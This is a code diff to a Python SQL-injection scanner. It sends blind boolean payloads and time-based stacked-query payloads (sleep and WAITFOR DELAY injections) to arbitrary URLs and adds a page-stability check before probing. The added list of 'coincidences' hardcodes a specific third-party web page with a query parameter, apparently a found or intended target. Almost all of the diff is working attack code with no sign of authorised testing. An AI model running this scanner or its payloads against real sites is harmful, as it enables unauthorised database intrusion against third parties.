@@ -8,7 +8,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 full = False
 num_page = 1
-coincidences = []
+coincidences = ["http://gartner.es/it/page.jsp?id=501912"]
 path = "log.txt"
 
 class bcolors():
@@ -27,40 +27,43 @@ class ActiveScanThread(Process):
     __types = ['Error-Based','Blind-Str','Blind-Int','Stacked-Queries-Str','Stacked-Queries-Int']
     __blindP = ["' and 'ayHj'='ayHj"," and 'ayHj'='ayHj'"]
     __blind = ["' and 'ayHj'='bjIn"," and 'ayHj'='bjIn'"]
-    __blindD = ["ayHj=ayHj", "ayHj = ayHj","%27ayHj%27=%27ayHj","ayHj ayHj","ayHjayHj","'ayHj'='ayHj","'ayHj'='ayHj'","&#039;ayHj&#039;=&#039;ayHj"]
+    __blindD = ["ayHj=ayHj", "ayHj = ayHj","%27ayHj%27=%27ayHj","ayHj ayHj","ayHjayHj","'ayHj'='ayHj","'ayHj'='ayHj'","&#039;ayHj&#039;=&#039;ayHj","&#39;ayHj&#39;=&#39;ayHj","ayHjayHj"]
     __stackedInt = [";sleep(5)-- ",";WAITFOR DELAY '00:00:05'-- "]
     __stackedStr = ["';sleep(5)-- ","';WAITFOR DELAY '00:00:05'-- "]
-    	
+    
     def __init__(self,url,remainder,pipe):
         self.url = url
         self.pipe = pipe
         self.remainder = remainder 
 	Process.__init__(self)	
-
     
     def run(self):
         
         peaceful = True
         for i in range(len(self.__types)):
             try:
-                if (i == 1) or (i == 2):
-          
-                    crafted1 = self.url + self.__blindP[i-1] + self.remainder
-                    raw1 = self.getRawHtml(crafted1)
+                if i == 1 or i == 2:
 		    
-		    crafted2 = self.url + self.__blind[i-1] + self.remainder
-		    raw2 = self.getRawHtml(crafted2)
-                
-                    if raw1 != raw2 and not self.discard(raw1):
-			if self.__blindP[i-1] not in raw1:
-			    self.injectionFound(i,self.__blindP[i-1],crafted1)
-			    if not full:
-				break
-			else:
-			    self.xssFound(crafted1)
+		    if self.notChanging():
+		        original = self.url + self.remainder
+			o = self.getRawHtml(original)
+
+			crafted1 = self.url + self.__blindP[i-1] + self.remainder
+			raw1 = self.getRawHtml(crafted1)
+			
+			crafted2 = self.url + self.__blind[i-1] + self.remainder
+			raw2 = self.getRawHtml(crafted2)
+		    
+			if (o == raw1) and (raw1 != raw2) and not self.discard(raw1):
+			    if self.__blindP[i-1] not in raw1:
+				self.injectionFound(i,self.__blindP[i-1],crafted1)
+				if not full:
+				    break
+			    else:
+				self.xssFound(crafted1)
                        
             
-		elif (i == 3) or (i == 4):
+		elif i == 3 or i == 4:
 		    
 		    original = self.url + self.remainder
 		    time1 = self.getElapsedTime(original)
@@ -103,8 +106,15 @@ class ActiveScanThread(Process):
                     break
         
         if peaceful: 
-            self.pipe.send("End.")   
+            self.pipe.send("End.") 
 	    
+    def notChanging(self):
+	url = self.url + self.remainder
+	r1 = self.getRawHtml(url)
+	r2 = self.getRawHtml(url)
+	
+	return r1 == r2
+    
     def clean_html(self,html):
         """
         Copied from NLTK package.
